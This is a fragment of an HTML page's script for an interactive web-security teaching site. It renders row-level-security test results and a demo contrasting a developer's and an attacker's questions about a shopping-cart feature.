                <div class="result-item success">‚úÖ User A cannot read User B's data</div>
                <div class="result-item success">‚úÖ User B can read/write own data</div>
                <div class="result-item success">‚úÖ User B cannot read User A's data</div>
                <p class="conclusion success">üéâ RLS is working correctly!</p>
              ` : `
                <div class="result-item success">‚úÖ User A can read/write own data</div>
                <div class="result-item error">‚ùå User A can read User B's data</div>
                <div class="result-item success">‚úÖ User B can read/write own data</div>
                <div class="result-item error">‚ùå User B can read User A's data</div>
                <p class="conclusion error">‚ö†Ô∏è RLS policies need fixing!</p>
              `}
            </div>
          `;
        }
      }, delay);
    });
  };
}

// Mindset Demo
function initMindsetDemo() {
  // Make sure the function is globally available
  if (typeof window !== 'undefined') {
    window.showThinking = function(type) {
      const output = document.getElementById('thinkingOutput');
      if (!output) {
        console.log('thinkingOutput element not found');
        return;
      }
      
      console.log('showThinking called with type:', type);
      
      if (type === 'developer') {
        output.innerHTML = `
          <div class="thinking-result developer">
            <h4>üë®‚Äçüíª Developer Perspective:</h4>
            <ul>
              <li>"User clicks button ‚Üí item gets added to cart"</li>
              <li>"Need to update the cart count in the UI"</li>
              <li>"Make sure the button doesn't double-click"</li>
              <li>"Check if item is in stock"</li>
            </ul>
            <p class="thinking-note">Focus: Functionality and user experience</p>
          </div>
        `;
      } else if (type === 'attacker') {
        output.innerHTML = `
          <div class="thinking-result attacker">
            <h4>üî• Attacker Perspective:</h4>
            <ul>
              <li>"Can I add negative quantities to get money back?"</li>
              <li>"What if I change the product ID to something expensive?"</li>
              <li>"Can I add items that don't exist or are deleted?"</li>
              <li>"What if I spam this 1000 times per second?"</li>
              <li>"Can I add items for other users' carts?"</li>
              <li>"What happens if I modify the price in the request?"</li>
            </ul>
            <p class="thinking-note danger">Focus: How to exploit and break the system</p>
          </div>
        `;
      }
    };
  }
}

// Initialize all demos
function initAllDemos() {
  // Wait for DOM to be ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      setTimeout(initAllDemos, 100);
    });
    return;
  }

  initMindsetDemo();
  initFrontendBackendDemo();
  initSecretsDemo();
  initRLSDemo();
  initXSSDemo();
  initRateLimitDemo();
  initHeadersDemo();
  initUploadDemo();
  initSSRFDemo();
  initRLSTestingDemo();
}
    </script>
  </body>
</html>